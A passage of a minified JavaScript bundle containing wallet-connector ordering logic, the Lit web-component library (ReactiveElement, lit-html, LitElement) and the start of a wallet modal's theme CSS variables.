0:i.rdns,r=!!e&&oe.state.excludedWallets.some(s=>!!s.rdns&&s.rdns===e),n=!!t.name&&oe.state.excludedWallets.some(s=>w2.isLowerCaseMatch(s.name,t.name));return!(t.type==="INJECTED"&&(!te.isMobile()&&t.name==="Browser Wallet"||!e&&!we.checkInstalled()||r||n)||(t.type==="ANNOUNCED"||t.type==="EXTERNAL")&&(r||n))},getIsConnectedWithWC(){return Array.from(B.state.chains.values()).some(t=>ae.getConnectorId(t.namespace)===ve.CONNECTOR_ID.WALLET_CONNECT)},getConnectorTypeOrder({recommended:t,featured:e,custom:r,recent:n,announced:i,injected:s,multiChain:o,external:a,overriddenConnectors:c=(l=>(l=Y.state.features)==null?void 0:l.connectorTypeOrder)()??[]}){const u=Ms.getIsConnectedWithWC(),h=[{type:"walletConnect",isEnabled:Y.state.enableWalletConnect&&!u},{type:"recent",isEnabled:n.length>0},{type:"injected",isEnabled:[...s,...i,...o].length>0},{type:"featured",isEnabled:e.length>0},{type:"custom",isEnabled:r&&r.length>0},{type:"external",isEnabled:a.length>0},{type:"recommended",isEnabled:t.length>0}].filter(p=>p.isEnabled),d=new Set(h.map(p=>p.type)),f=c.filter(p=>d.has(p)).map(p=>({type:p,isEnabled:!0})),g=h.filter(({type:p})=>!f.some(({type:w})=>w===p));return Array.from(new Set([...f,...g].map(({type:p})=>p)))}};/**
* @license
* Copyright 2019 Google LLC
* SPDX-License-Identifier: BSD-3-Clause
*/const B0=globalThis,y2=B0.ShadowRoot&&(B0.ShadyCSS===void 0||B0.ShadyCSS.nativeShadow)&&"adoptedStyleSheets"in Document.prototype&&"replace"in CSSStyleSheet.prototype,b2=Symbol(),H4=new WeakMap;class v9{constructor(e,r,n){if(this._$cssResult$=!0,n!==b2)throw Error("CSSResult is not constructable. Use `unsafeCSS` or `css` instead.");this.cssText=e,this.t=r}get styleSheet(){let e=this.o;const r=this.t;if(y2&&e===void 0){const n=r!==void 0&&r.length===1;n&&(e=H4.get(r)),e===void 0&&((this.o=e=new CSSStyleSheet).replaceSync(this.cssText),n&&H4.set(r,e))}return e}toString(){return this.cssText}}const _n=t=>new v9(typeof t=="string"?t:t+"",void 0,b2),Ae=(t,...e)=>{const r=t.length===1?t[0]:e.reduce((n,i,s)=>n+(o=>{if(o._$cssResult$===!0)return o.cssText;if(typeof o=="number")return o;throw Error("Value passed to 'css' function must be a 'css' function result: "+o+". Use 'unsafeCSS' to pass non-literal values, but take care to ensure page security.")})(i)+t[s+1],t[0]);return new v9(r,t,b2)},vW=(t,e)=>{if(y2)t.adoptedStyleSheets=e.map(r=>r instanceof CSSStyleSheet?r:r.styleSheet);else for(const r of e){const n=document.createElement("style"),i=B0.litNonce;i!==void 0&&n.setAttribute("nonce",i),n.textContent=r.cssText,t.appendChild(n)}},q4=y2?t=>t:t=>t instanceof CSSStyleSheet?(e=>{let r="";for(const n of e.cssRules)r+=n.cssText;return _n(r)})(t):t;/**
* @license
* Copyright 2017 Google LLC
* SPDX-License-Identifier: BSD-3-Clause
*/const{is:EW,defineProperty:CW,getOwnPropertyDescriptor:AW,getOwnPropertyNames:xW,getOwnPropertySymbols:IW,getPrototypeOf:SW}=Object,Mo=globalThis,V4=Mo.trustedTypes,NW=V4?V4.emptyScript:"",zw=Mo.reactiveElementPolyfillSupport,Sd=(t,e)=>t,fg={toAttribute(t,e){switch(e){case Boolean:t=t?NW:null;break;case Object:case Array:t=t==null?t:JSON.stringify(t)}return t},fromAttribute(t,e){let r=t;switch(e){case Boolean:r=t!==null;break;case Number:r=t===null?null:Number(t);break;case Object:case Array:try{r=JSON.parse(t)}catch{r=null}}return r}},v2=(t,e)=>!EW(t,e),W4={attribute:!0,type:String,converter:fg,reflect:!1,useDefault:!1,hasChanged:v2};Symbol.metadata??(Symbol.metadata=Symbol("metadata")),Mo.litPropertyMetadata??(Mo.litPropertyMetadata=new WeakMap);class Il extends HTMLElement{static addInitializer(e){this._$Ei(),(this.l??(this.l=[])).push(e)}static get observedAttributes(){return this.finalize(),this._$Eh&&[...this._$Eh.keys()]}static createProperty(e,r=W4){if(r.state&&(r.attribute=!1),this._$Ei(),this.prototype.hasOwnProperty(e)&&((r=Object.create(r)).wrapped=!0),this.elementProperties.set(e,r),!r.noAccessor){const n=Symbol(),i=this.getPropertyDescriptor(e,n,r);i!==void 0&&CW(this.prototype,e,i)}}static getPropertyDescriptor(e,r,n){const{get:i,set:s}=AW(this.prototype,e)??{get(){return this[r]},set(o){this[r]=o}};return{get:i,set(o){const a=i==null?void 0:i.call(this);s==null||s.call(this,o),this.requestUpdate(e,a,n)},configurable:!0,enumerable:!0}}static getPropertyOptions(e){return this.elementProperties.get(e)??W4}static _$Ei(){if(this.hasOwnProperty(Sd("elementProperties")))return;const e=SW(this);e.finalize(),e.l!==void 0&&(this.l=[...e.l]),this.elementProperties=new Map(e.elementProperties)}static finalize(){if(this.hasOwnProperty(Sd("finalized")))return;if(this.finalized=!0,this._$Ei(),this.hasOwnProperty(Sd("properties"))){const r=this.properties,n=[...xW(r),...IW(r)];for(const i of n)this.createProperty(i,r[i])}const e=this[Symbol.metadata];if(e!==null){const r=litPropertyMetadata.get(e);if(r!==void 0)for(const[n,i]of r)this.elementProperties.set(n,i)}this._$Eh=new Map;for(const[r,n]of this.elementProperties){const i=this._$Eu(r,n);i!==void 0&&this._$Eh.set(i,r)}this.elementStyles=this.finalizeStyles(this.styles)}static finalizeStyles(e){const r=[];if(Array.isArray(e)){const n=new Set(e.flat(1/0).reverse());for(const i of n)r.unshift(q4(i))}else e!==void 0&&r.push(q4(e));return r}static _$Eu(e,r){const n=r.attribute;return n===!1?void 0:typeof n=="string"?n:typeof e=="string"?e.toLowerCase():void 0}constructor(){super(),this._$Ep=void 0,this.isUpdatePending=!1,this.hasUpdated=!1,this._$Em=null,this._$Ev()}_$Ev(){var e;this._$ES=new Promise(r=>this.enableUpdating=r),this._$AL=new Map,this._$E_(),this.requestUpdate(),(e=this.constructor.l)==null||e.forEach(r=>r(this))}addController(e){var r;(this._$EO??(this._$EO=new Set)).add(e),this.renderRoot!==void 0&&this.isConnected&&((r=e.hostConnected)==null||r.call(e))}removeController(e){var r;(r=this._$EO)==null||r.delete(e)}_$E_(){const e=new Map,r=this.constructor.elementProperties;for(const n of r.keys())this.hasOwnProperty(n)&&(e.set(n,this[n]),delete this[n]);e.size>0&&(this._$Ep=e)}createRenderRoot(){const e=this.shadowRoot??this.attachShadow(this.constructor.shadowRootOptions);return vW(e,this.constructor.elementStyles),e}connectedCallback(){var e;this.renderRoot??(this.renderRoot=this.createRenderRoot()),this.enableUpdating(!0),(e=this._$EO)==null||e.forEach(r=>{var n;return(n=r.hostConnected)==null?void 0:n.call(r)})}enableUpdating(e){}disconnectedCallback(){var e;(e=this._$EO)==null||e.forEach(r=>{var n;return(n=r.hostDisconnected)==null?void 0:n.call(r)})}attributeChangedCallback(e,r,n){this._$AK(e,n)}_$ET(e,r){var s;const n=this.constructor.elementProperties.get(e),i=this.constructor._$Eu(e,n);if(i!==void 0&&n.reflect===!0){const o=(((s=n.converter)==null?void 0:s.toAttribute)!==void 0?n.converter:fg).toAttribute(r,n.type);this._$Em=e,o==null?this.removeAttribute(i):this.setAttribute(i,o),this._$Em=null}}_$AK(e,r){var s,o;const n=this.constructor,i=n._$Eh.get(e);if(i!==void 0&&this._$Em!==i){const a=n.getPropertyOptions(i),c=typeof a.converter=="function"?{fromAttribute:a.converter}:((s=a.converter)==null?void 0:s.fromAttribute)!==void 0?a.converter:fg;this._$Em=i,this[i]=c.fromAttribute(r,a.type)??((o=this._$Ej)==null?void 0:o.get(i))??null,this._$Em=null}}requestUpdate(e,r,n){var i;if(e!==void 0){const s=this.constructor,o=this[e];if(n??(n=s.getPropertyOptions(e)),!((n.hasChanged??v2)(o,r)||n.useDefault&&n.reflect&&o===((i=this._$Ej)==null?void 0:i.get(e))&&!this.hasAttribute(s._$Eu(e,n))))return;this.C(e,r,n)}this.isUpdatePending===!1&&(this._$ES=this._$EP())}C(e,r,{useDefault:n,reflect:i,wrapped:s},o){n&&!(this._$Ej??(this._$Ej=new Map)).has(e)&&(this._$Ej.set(e,o??r??this[e]),s!==!0||o!==void 0)||(this._$AL.has(e)||(this.hasUpdated||n||(r=void 0),this._$AL.set(e,r)),i===!0&&this._$Em!==e&&(this._$Eq??(this._$Eq=new Set)).add(e))}async _$EP(){this.isUpdatePending=!0;try{await this._$ES}catch(r){Promise.reject(r)}const e=this.scheduleUpdate();return e!=null&&await e,!this.isUpdatePending}scheduleUpdate(){return this.performUpdate()}performUpdate(){var n;if(!this.isUpdatePending)return;if(!this.hasUpdated){if(this.renderRoot??(this.renderRoot=this.createRenderRoot()),this._$Ep){for(const[s,o]of this._$Ep)this[s]=o;this._$Ep=void 0}const i=this.constructor.elementProperties;if(i.size>0)for(const[s,o]of i){const{wrapped:a}=o,c=this[s];a!==!0||this._$AL.has(s)||c===void 0||this.C(s,void 0,o,c)}}let e=!1;const r=this._$AL;try{e=this.shouldUpdate(r),e?(this.willUpdate(r),(n=this._$EO)==null||n.forEach(i=>{var s;return(s=i.hostUpdate)==null?void 0:s.call(i)}),this.update(r)):this._$EM()}catch(i){throw e=!1,this._$EM(),i}e&&this._$AE(r)}willUpdate(e){}_$AE(e){var r;(r=this._$EO)==null||r.forEach(n=>{var i;return(i=n.hostUpdated)==null?void 0:i.call(n)}),this.hasUpdated||(this.hasUpdated=!0,this.firstUpdated(e)),this.updated(e)}_$EM(){this._$AL=new Map,this.isUpdatePending=!1}get updateComplete(){return this.getUpdateComplete()}getUpdateComplete(){return this._$ES}shouldUpdate(e){return!0}update(e){this._$Eq&&(this._$Eq=this._$Eq.forEach(r=>this._$ET(r,this[r]))),this._$EM()}updated(e){}firstUpdated(e){}}Il.elementStyles=[],Il.shadowRootOptions={mode:"open"},Il[Sd("elementProperties")]=new Map,Il[Sd("finalized")]=new Map,zw==null||zw({ReactiveElement:Il}),(Mo.reactiveElementVersions??(Mo.reactiveElementVersions=[])).push("2.1.0");/**
* @license
* Copyright 2017 Google LLC
* SPDX-License-Identifier: BSD-3-Clause
*/const Nd=globalThis,pg=Nd.trustedTypes,G4=pg?pg.createPolicy("lit-html",{createHTML:t=>t}):void 0,E9="$lit$",po=`lit$${Math.random().toFixed(9).slice(2)}$`,C9="?"+po,PW=`<${C9}>`,Pc=document,hf=()=>Pc.createComment(""),df=t=>t===null||typeof t!="object"&&typeof t!="function",E2=Array.isArray,kW=t=>E2(t)||typeof(t==null?void 0:t[Symbol.iterator])=="function",jw=`[ 	
\f\r]`,Dh=/<(?:(!--|\/[^a-zA-Z])|(\/?[a-zA-Z][^>\s]*)|(\/?$))/g,K4=/-->/g,Z4=/>/g,ra=RegExp(`>|${jw}(?:([^\\s"'>=/]+)(${jw}*=${jw}*(?:[^ 	
\f\r"'\`<>=]|("|')|))|$)`,"g"),J4=/'/g,Q4=/"/g,A9=/^(?:script|style|textarea|title)$/i,x9=t=>(e,...r)=>({_$litType$:t,strings:e,values:r}),U=x9(1),re=x9(2),Hs=Symbol.for("lit-noChange"),Nt=Symbol.for("lit-nothing"),Y4=new WeakMap,Da=Pc.createTreeWalker(Pc,129);function I9(t,e){if(!E2(t)||!t.hasOwnProperty("raw"))throw Error("invalid template strings array");return G4!==void 0?G4.createHTML(e):e}const OW=(t,e)=>{const r=t.length-1,n=[];let i,s=e===2?"<svg>":e===3?"<math>":"",o=Dh;for(let a=0;a<r;a++){const c=t[a];let l,u,h=-1,d=0;for(;d<c.length&&(o.lastIndex=d,u=o.exec(c),u!==null);)d=o.lastIndex,o===Dh?u[1]==="!--"?o=K4:u[1]!==void 0?o=Z4:u[2]!==void 0?(A9.test(u[2])&&(i=RegExp("</"+u[2],"g")),o=ra):u[3]!==void 0&&(o=ra):o===ra?u[0]===">"?(o=i??Dh,h=-1):u[1]===void 0?h=-2:(h=o.lastIndex-u[2].length,l=u[1],o=u[3]===void 0?ra:u[3]==='"'?Q4:J4):o===Q4||o===J4?o=ra:o===K4||o===Z4?o=Dh:(o=ra,i=void 0);const f=o===ra&&t[a+1].startsWith("/>")?" ":"";s+=o===Dh?c+PW:h>=0?(n.push(l),c.slice(0,h)+E9+c.slice(h)+po+f):c+po+(h===-2?a:f)}return[I9(t,s+(t[r]||"<?>")+(e===2?"</svg>":e===3?"</math>":"")),n]};class ff{constructor({strings:e,_$litType$:r},n){let i;this.parts=[];let s=0,o=0;const a=e.length-1,c=this.parts,[l,u]=OW(e,r);if(this.el=ff.createElement(l,n),Da.currentNode=this.el.content,r===2||r===3){const h=this.el.content.firstChild;h.replaceWith(...h.childNodes)}for(;(i=Da.nextNode())!==null&&c.length<a;){if(i.nodeType===1){if(i.hasAttributes())for(const h of i.getAttributeNames())if(h.endsWith(E9)){const d=u[o++],f=i.getAttribute(h).split(po),g=/([.?@])?(.*)/.exec(d);c.push({type:1,index:s,name:g[2],strings:f,ctor:g[1]==="."?TW:g[1]==="?"?$W:g[1]==="@"?RW:f1}),i.removeAttribute(h)}else h.startsWith(po)&&(c.push({type:6,index:s}),i.removeAttribute(h));if(A9.test(i.tagName)){const h=i.textContent.split(po),d=h.length-1;if(d>0){i.textContent=pg?pg.emptyScript:"";for(let f=0;f<d;f++)i.append(h[f],hf()),Da.nextNode(),c.push({type:2,index:++s});i.append(h[d],hf())}}}else if(i.nodeType===8)if(i.data===C9)c.push({type:2,index:s});else{let h=-1;for(;(h=i.data.indexOf(po,h+1))!==-1;)c.push({type:7,index:s}),h+=po.length-1}s++}}static createElement(e,r){const n=Pc.createElement("template");return n.innerHTML=e,n}}function Qu(t,e,r=t,n){var o,a;if(e===Hs)return e;let i=n!==void 0?(o=r._$Co)==null?void 0:o[n]:r._$Cl;const s=df(e)?void 0:e._$litDirective$;return(i==null?void 0:i.constructor)!==s&&((a=i==null?void 0:i._$AO)==null||a.call(i,!1),s===void 0?i=void 0:(i=new s(t),i._$AT(t,r,n)),n!==void 0?(r._$Co??(r._$Co=[]))[n]=i:r._$Cl=i),i!==void 0&&(e=Qu(t,i._$AS(t,e.values),i,n)),e}class _W{constructor(e,r){this._$AV=[],this._$AN=void 0,this._$AD=e,this._$AM=r}get parentNode(){return this._$AM.parentNode}get _$AU(){return this._$AM._$AU}u(e){const{el:{content:r},parts:n}=this._$AD,i=((e==null?void 0:e.creationScope)??Pc).importNode(r,!0);Da.currentNode=i;let s=Da.nextNode(),o=0,a=0,c=n[0];for(;c!==void 0;){if(o===c.index){let l;c.type===2?l=new np(s,s.nextSibling,this,e):c.type===1?l=new c.ctor(s,c.name,c.strings,this,e):c.type===6&&(l=new DW(s,this,e)),this._$AV.push(l),c=n[++a]}o!==(c==null?void 0:c.index)&&(s=Da.nextNode(),o++)}return Da.currentNode=Pc,i}p(e){let r=0;for(const n of this._$AV)n!==void 0&&(n.strings!==void 0?(n._$AI(e,n,r),r+=n.strings.length-2):n._$AI(e[r])),r++}}class np{get _$AU(){var e;return((e=this._$AM)==null?void 0:e._$AU)??this._$Cv}constructor(e,r,n,i){this.type=2,this._$AH=Nt,this._$AN=void 0,this._$AA=e,this._$AB=r,this._$AM=n,this.options=i,this._$Cv=(i==null?void 0:i.isConnected)??!0}get parentNode(){let e=this._$AA.parentNode;const r=this._$AM;return r!==void 0&&(e==null?void 0:e.nodeType)===11&&(e=r.parentNode),e}get startNode(){return this._$AA}get endNode(){return this._$AB}_$AI(e,r=this){e=Qu(this,e,r),df(e)?e===Nt||e==null||e===""?(this._$AH!==Nt&&this._$AR(),this._$AH=Nt):e!==this._$AH&&e!==Hs&&this._(e):e._$litType$!==void 0?this.$(e):e.nodeType!==void 0?this.T(e):kW(e)?this.k(e):this._(e)}O(e){return this._$AA.parentNode.insertBefore(e,this._$AB)}T(e){this._$AH!==e&&(this._$AR(),this._$AH=this.O(e))}_(e){this._$AH!==Nt&&df(this._$AH)?this._$AA.nextSibling.data=e:this.T(Pc.createTextNode(e)),this._$AH=e}$(e){var s;const{values:r,_$litType$:n}=e,i=typeof n=="number"?this._$AC(e):(n.el===void 0&&(n.el=ff.createElement(I9(n.h,n.h[0]),this.options)),n);if(((s=this._$AH)==null?void 0:s._$AD)===i)this._$AH.p(r);else{const o=new _W(i,this),a=o.u(this.options);o.p(r),this.T(a),this._$AH=o}}_$AC(e){let r=Y4.get(e.strings);return r===void 0&&Y4.set(e.strings,r=new ff(e)),r}k(e){E2(this._$AH)||(this._$AH=[],this._$AR());const r=this._$AH;let n,i=0;for(const s of e)i===r.length?r.push(n=new np(this.O(hf()),this.O(hf()),this,this.options)):n=r[i],n._$AI(s),i++;i<r.length&&(this._$AR(n&&n._$AB.nextSibling,i),r.length=i)}_$AR(e=this._$AA.nextSibling,r){var n;for((n=this._$AP)==null?void 0:n.call(this,!1,!0,r);e&&e!==this._$AB;){const i=e.nextSibling;e.remove(),e=i}}setConnected(e){var r;this._$AM===void 0&&(this._$Cv=e,(r=this._$AP)==null||r.call(this,e))}}class f1{get tagName(){return this.element.tagName}get _$AU(){return this._$AM._$AU}constructor(e,r,n,i,s){this.type=1,this._$AH=Nt,this._$AN=void 0,this.element=e,this.name=r,this._$AM=i,this.options=s,n.length>2||n[0]!==""||n[1]!==""?(this._$AH=Array(n.length-1).fill(new String),this.strings=n):this._$AH=Nt}_$AI(e,r=this,n,i){const s=this.strings;let o=!1;if(s===void 0)e=Qu(this,e,r,0),o=!df(e)||e!==this._$AH&&e!==Hs,o&&(this._$AH=e);else{const a=e;let c,l;for(e=s[0],c=0;c<s.length-1;c++)l=Qu(this,a[n+c],r,c),l===Hs&&(l=this._$AH[c]),o||(o=!df(l)||l!==this._$AH[c]),l===Nt?e=Nt:e!==Nt&&(e+=(l??"")+s[c+1]),this._$AH[c]=l}o&&!i&&this.j(e)}j(e){e===Nt?this.element.removeAttribute(this.name):this.element.setAttribute(this.name,e??"")}}class TW extends f1{constructor(){super(...arguments),this.type=3}j(e){this.element[this.name]=e===Nt?void 0:e}}class $W extends f1{constructor(){super(...arguments),this.type=4}j(e){this.element.toggleAttribute(this.name,!!e&&e!==Nt)}}class RW extends f1{constructor(e,r,n,i,s){super(e,r,n,i,s),this.type=5}_$AI(e,r=this){if((e=Qu(this,e,r,0)??Nt)===Hs)return;const n=this._$AH,i=e===Nt&&n!==Nt||e.capture!==n.capture||e.once!==n.once||e.passive!==n.passive,s=e!==Nt&&(n===Nt||i);i&&this.element.removeEventListener(this.name,this,n),s&&this.element.addEventListener(this.name,this,e),this._$AH=e}handleEvent(e){var r;typeof this._$AH=="function"?this._$AH.call(((r=this.options)==null?void 0:r.host)??this.element,e):this._$AH.handleEvent(e)}}class DW{constructor(e,r,n){this.element=e,this.type=6,this._$AN=void 0,this._$AM=r,this.options=n}get _$AU(){return this._$AM._$AU}_$AI(e){Qu(this,e)}}const Hw=Nd.litHtmlPolyfillSupport;Hw==null||Hw(ff,np),(Nd.litHtmlVersions??(Nd.litHtmlVersions=[])).push("3.3.0");const BW=(t,e,r)=>{const n=(r==null?void 0:r.renderBefore)??e;let i=n._$litPart$;if(i===void 0){const s=(r==null?void 0:r.renderBefore)??null;n._$litPart$=i=new np(e.insertBefore(hf(),s),s,void 0,r??{})}return i._$AI(t),i};/**
* @license
* Copyright 2017 Google LLC
* SPDX-License-Identifier: BSD-3-Clause
*/const dc=globalThis;class fe extends Il{constructor(){super(...arguments),this.renderOptions={host:this},this._$Do=void 0}createRenderRoot(){var r;const e=super.createRenderRoot();return(r=this.renderOptions).renderBefore??(r.renderBefore=e.firstChild),e}update(e){const r=this.render();this.hasUpdated||(this.renderOptions.isConnected=this.isConnected),super.update(e),this._$Do=BW(r,this.renderRoot,this.renderOptions)}connectedCallback(){var e;super.connectedCallback(),(e=this._$Do)==null||e.setConnected(!0)}disconnectedCallback(){var e;super.disconnectedCallback(),(e=this._$Do)==null||e.setConnected(!1)}render(){return Hs}}var G6;fe._$litElement$=!0,fe.finalized=!0,(G6=dc.litElementHydrateSupport)==null||G6.call(dc,{LitElement:fe});const qw=dc.litElementPolyfillSupport;qw==null||qw({LitElement:fe}),(dc.litElementVersions??(dc.litElementVersions=[])).push("4.2.0");let Pd,Fo,zo;function LW(t,e){Pd=document.createElement("style"),Fo=document.createElement("style"),zo=document.createElement("style"),Pd.textContent=ql(t).core.cssText,Fo.textContent=ql(t).dark.cssText,zo.textContent=ql(t).light.cssText,document.head.appendChild(Pd),document.head.appendChild(Fo),document.head.appendChild(zo),S9(e)}function S9(t){Fo&&zo&&(t==="light"?(Fo.removeAttribute("media"),zo.media="enabled"):(zo.removeAttribute("media"),Fo.media="enabled"))}function UW(t){Pd&&Fo&&zo&&(Pd.textContent=ql(t).core.cssText,Fo.textContent=ql(t).dark.cssText,zo.textContent=ql(t).light.cssText)}function ql(t){return{core:Ae`
      @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
      @keyframes w3m-shake {
        0% {
          transform: scale(1) rotate(0deg);
        }
        20% {
          transform: scale(1) rotate(-1deg);
        }
        40% {
          transform: scale(1) rotate(1.5deg);
        }
        60% {
          transform: scale(1) rotate(-1.5deg);
        }
        80% {
          transform: scale(1) rotate(1deg);
        }
        100% {
          transform: scale(1) rotate(0deg);
        }
      }
      @keyframes w3m-iframe-fade-out {
        0% {
          opacity: 1;
        }
        100% {
          opacity: 0;
        }
      }
      @keyframes w3m-iframe-zoom-in {
        0% {
          transform: translateY(50px);
          opacity: 0;
        }
        100% {
          transform: translateY(0px);
          opacity: 1;
        }
      }
      @keyframes w3m-iframe-zoom-in-mobile {
        0% {
          transform: scale(0.95);
          opacity: 0;
        }
        100% {
          transform: scale(1);
          opacity: 1;
        }
      }
      :root {
        --w3m-modal-width: 360px;
        --w3m-color-mix-strength: ${_n(t!=null&&t["--w3m-color-mix-strength"]?`${t["--w3m-color-mix-strength"]}%`:"0%")};
        --w3m-font-family: ${_n((t==null?void 0:t["--w3m-font-family"])||"Inter, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif;")};
        --w3m-font-size-master: ${_n((t==null?void 0:t["--w3m-font-size-master"])||"10px")};
        --w3m-border-radius-master: ${_n((t==null?void 0:t["--w3m-border-radius-master"])||"4px")};
        --w3m-z-index: ${_n((t==null?void 0:t["--w3m-z-index"])||999)};

        --wui-font-family: var(--w3m-font-family);

        --wui-font-size-mini: calc(var(--w3m-font-size-master) * 0.8);
        --wui-font-size-micro: var(--w3m-font-size-master);
        --wui-font-size-tiny: calc(var(--w3m-font-size-master) * 1.2);
        --wui-font-size-small: calc(var(--w3m-font-size-master) * 1.4);
        --wui-font-size-paragraph: calc(var(--w3m-font-size-master) * 1.6);
        --wui-font-size-medium: calc(var(--w3m-font-size-master) * 1.8);
        --wui-font-size-large: calc(var(--w3m-font-size-master) * 2);
        --wui-font-size-title-6: calc(var(--w3m-font-size-master) * 2.2);
        --wui-font-size-medium-title: calc(var(--w3m-font-size-master) * 2.4);
        --wui-font-size-2xl: calc(var(--w3m-font-size-master) * 4);

        --wui-border-radius-5xs: var(--w3m-border-radius-master);
        --wui-border-radius-4xs: calc(var(--w3m-border-radius-master) * 1.5);
        --wui-border-radius-3xs: calc(var(--w3m-border-radius-master) * 2);
        --wui-border-radius-xxs: calc(var(--w3m-border-radius-master) * 3);
        --wui-border-radius-xs: calc(var(--w3m-border-radius-master) * 4);
        --wui-border-radius-s: calc(var(--w3m-border-radius-master) * 5);
        --wui-border-radius-m: calc(var(--w3m-border-radius-master) * 7);
        --wui-border-radius-l: calc(var(--w3m-border-radius-master) * 9);
        --wui-border-radius-3xl: calc(var(--w3m-border-radius-master) * 20);

        --wui-font-weight-light: 400;
        --wui-font-weight-regular: 500;
        --wui-font-weight-medium: 600;
        --wui-font-weight-bold: 700;

        --wui-letter-spacing-2xl: -1.6px;
        --wui-letter-spacing-medium-title: -0.96px;
        --wui-letter-spacing-title-6: -0.88px;
        --wui-letter-spacing-large: -0.8px;
        --wui-letter-spacing-medium: -0.72px;
        --wui-letter-spacing-paragraph: -0.64px;
        --wui-letter-spacing-small: -0.56px;
        --wui-letter-spacing-tiny: -0.48px;
        --wui-letter-spacing-micro: -0.2px;
        --wui-letter-spacing-mini: -0.16px;

        --wui-spacing-0: 0px;
        --wui-spacing-4xs: 2px;
        --wui-spacing-3xs: 4px;
        --wui-spacing-xxs: 6px;
        --wui-spacing-2xs: 7px;
        --wui-spacing-xs: 8px;
        --wui-spacing-1xs: 10px;
        --wui-spacing-s: 12px;
        --wui-spacing-m: 14px;
        --wui-spacing-l: 16px;
        --wui-spacing-2l: 18px;
        --wui-spacing-xl: 20px;
        --wui-spacing-xxl: 24px;
        --wui-spacing-2xl: 32px;
        --wui-spacing-3xl: 40px;
        --wui-spacing-4xl: 90px;
        --wui-spacing-5xl: 95px;

        --wui-icon-box-size-xxs: 14px;
        --wui-icon-box-size-xs: 20px;
        --wui-icon-box-size-sm: 24px;
        --wui-icon-box-size-md: 32px;
        --wui-icon-box-size-mdl: 36px;
        --wui-icon-box-size-lg: 40px;
        --wui-icon-box-size-2lg: 48px;
        --wui-icon-box-size-xl: 64px;

        --wui-icon-size-inherit: inherit;
        --wui-icon-size-xxs: 10px;
        --wui-icon-size-xs: 12px;
        --wui-icon-size-sm: 14px;
        --wui-icon-size-md: 16px;
        --wui-icon-size-mdl: 18px;
        --wui-icon-size-lg: 20px;
        --wui-icon-size-xl: 24px;
        --wui-icon-size-xxl: 28px;

        --wui-wallet-image-size-inherit: inherit;
        --wui-wallet-image-size-sm: 40px;
        --wui-wallet-image-size-md: 56px;
        --wui-wallet-image-size-lg: 80px;

        --wui-visual-size-size-inherit: inherit;
        --wui-visual-size-sm: 40px;
        --wui-visual-size-md: 55px;
        --wui-visual-size-lg: 80px;

        --wui-box-size-md: 100px;
        --wui-box-size-lg: 120px;

        --wui-ease-out-power-2: cubic-bezier(0, 0, 0.22, 1);
        --wui-ease-out-power-1: cubic-bezier(0, 0, 0.55, 1);

        --wui-ease-in-power-3: cubic-bezier(0.66, 0, 1, 1);
        --wui-ease-in-power-2: cubic-bezier(0.45, 0, 1, 1);
        --wui-ease-in-power-1: cubic-bezier(0.3, 0, 1, 1);

        --wui-ease-inout-power-1: cubic-bezier(0.45, 0, 0.55, 1);

        --wui-duration-lg: 200ms;
        --wui-duration-md: 125ms;
        --wui-duration-sm: 75ms;

        --wui-path-network-sm: path(
          'M15.4 2.1a5.21 5.21 0 0 1 5.2 0l11.61 6.7a5.21 5.21 0 0 1 2.61 4.52v13.4c0 1.87-1 3.59-2.6 4.52l-11.61 6.7c-1.62.93-3.6.93-5.22 0l-11.6-6.7a5.21 5.21 0 0 1-2.61-4.51v-13.4c0-1.87 1-3.6 2.6-4.52L15.4 2.1Z'
        );

        --wui-path-network-md: path(
          'M43.4605 10.7248L28.0485 1.61089C25.5438 0.129705 22.4562 0.129705 19.9515 1.61088L4.53951 10.7248C2.03626 12.2051 0.5 14.9365 0.5 17.886V36.1139C0.5 39.0635 2.03626 41.7949 4.53951 43.2752L19.9515 52.3891C22.4562 53.8703 25.5438 53.8703 28.0485 52.3891L43.4605 43.2752C45.9637 41.7949 47.5 39.0635 47.5 36.114V17.8861C47.5 14.9365 45.9637 12.2051 43.4605 10.7248Z'
        );

        --wui-path-network-lg: path(
          'M78.3244 18.926L50.1808 2.45078C45.7376 -0.150261 40.2624 -0.150262 35.8192 2.45078L7.6756 18.926C3.23322 21.5266 0.5 26.3301 0.5 31.5248V64.4752C0.5 69.6699 3.23322 74.4734 7.6756 77.074L35.8192 93.5492C40.2624 96.1503 45.7376 96.1503 50.1808 93.5492L78.3244 77.074C82.7668 74.4734 85.5 69.6699 85.5 64.4752V31.5248C85.5 26.3301 82.7668 21.5266 78.3244 18.926Z'
        );

        --wui-width-network-sm: 36px;
        --wui-width-network-md: 48px;
        --wui-width-network-lg: 86px;

        --wui-height-network-sm: 40px;
        --wui-height-network-md: 54px;
        --wui-height-network-lg: 96px;

        --wui-icon-size-network-xs: 12px;
        --wui-icon-size-network-sm: 16px;
        --wui-icon-size-network-md: 24px;
        --wui-icon-size-network-lg: 42px;

        --wui-color-inherit: inherit;

        --wui-color-inverse-100: #fff;
        --wui-color-inverse-000: #000;

        --wui-cover: rgba(20, 20, 20, 0.8);

        --wui-color-modal-bg: var(--wui-color-modal-bg-base);

        --wui-color-accent-100: var(--wui-color-accent-base-100);
        --wui-color-accent-090: var(--wui-color-accent-base-090);
        --wui-color-accent-080: var(--wui-color-accent-base-080);

        --wui-color-success-100: var(--wui-color-success-base-100);
        --wui-color-success-125: var(--wui-color-success-base-125);

        --wui-color-warning-100: var(--wui-color-warning-base-100);

        --wui-color-error-100: var(--wui-color-error-base-100);
        --wui-color-error-125: var(--wui-color-error-base-125);

        --wui-color-blue-100: var(--wui-color-blue-base-100);
        --wui-color-blue-90: var(--wui-color-blue-base-90);

        --wui-icon-box-bg-error-100: var(--wui-icon-box-bg-error-base-100);
        --wui-icon-box-bg-blue-100: var(--wui-icon-box-bg-blue-base-100);
        --wui-icon-box-bg-success-100: var(--wui-icon-box-bg-success-base-100);
        --wui-icon-box-bg-inverse-100: var(--wui-icon-box-bg-inverse-base-100);

        --wui-all-wallets-bg-100: var(--wui-all-wallets-bg-100);

        --wui-avatar-border: var(--wui-avatar-border-base);

        --wui-thumbnail-border: var(--wui-thumbnail-border-base);

        --wui-wallet-button-bg: var(--wui-wallet-button-bg-base);

        --wui-box-shadow-blue: var(--wui-color-accent-glass-020);
      }

      @supports (background: color-mix(in srgb, white 50%, black)) {
        :root {
          --wui-color-modal-bg: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-modal-bg-base)
          );

